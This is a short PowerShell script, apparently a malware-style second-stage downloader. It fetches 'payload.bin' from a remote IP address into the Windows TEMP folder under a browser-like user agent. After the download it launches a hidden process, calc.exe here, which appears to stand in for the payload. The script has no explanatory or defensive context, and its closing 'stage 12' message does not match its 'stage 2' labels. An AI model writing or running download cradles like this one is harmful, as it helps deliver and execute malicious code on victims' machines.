$Stage2Url = "https://198.51.100.181/payload.bin"
$DownloadPath = "$env:TEMP\payload.bin"
$ConnectionTimeout = 184
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Invoke-PayloadFetch -SourceUrl $Stage2Url -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($TransferResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Write-Output "stage 12 initialized"
Set-Location -Path $env:TEMP
